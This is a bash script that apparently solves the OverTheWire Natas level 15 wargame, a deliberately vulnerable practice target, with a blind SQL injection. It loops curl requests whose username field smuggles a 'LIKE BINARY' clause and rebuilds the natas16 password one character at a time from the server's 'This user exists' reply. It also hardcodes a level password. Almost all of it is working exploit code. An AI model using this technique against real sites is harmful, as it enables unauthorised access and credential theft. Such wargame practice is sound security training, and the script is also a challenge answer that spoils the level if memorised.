#!/bin/bash
# level located on natas15.natas.labs.overthewire.org

passwordNatas15=""
defaultPasswordNatas15="SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

echo -n "Password Natas 15 (default is ${defaultPasswordNatas15}): "
read passwordNatas15
if [ -z ${passwordNatas15} ]
then
        passwordNatas15=${defaultPasswordNatas15}
fi

secretSymbols="________________________________" # 32 symbols _
password=""

while [ ${#secretSymbols} -ne 0 ]
do
        secretSymbols="${secretSymbols:1}"

        for symbol in {A..Z} {a..z} {0..9}
        do
                res=$(curl -s natas15.natas.labs.overthewire.org?debug=true -u natas15:${passwordNatas15} -d username="natas16\" and password LIKE BINARY \"${password}${symbol}${secretSymbols}")
                if [ -z ${res} ]
                then
                        echo -e "\nThe server isn't response"
                        exit
                elif echo ${res} | grep "This user exists" > /dev/null
                then
                        password="${password}${symbol}"
                        echo "${password}${secretSymbols}"
                        break
                fi
        done
done

echo -e "\nThe password is ${password}"
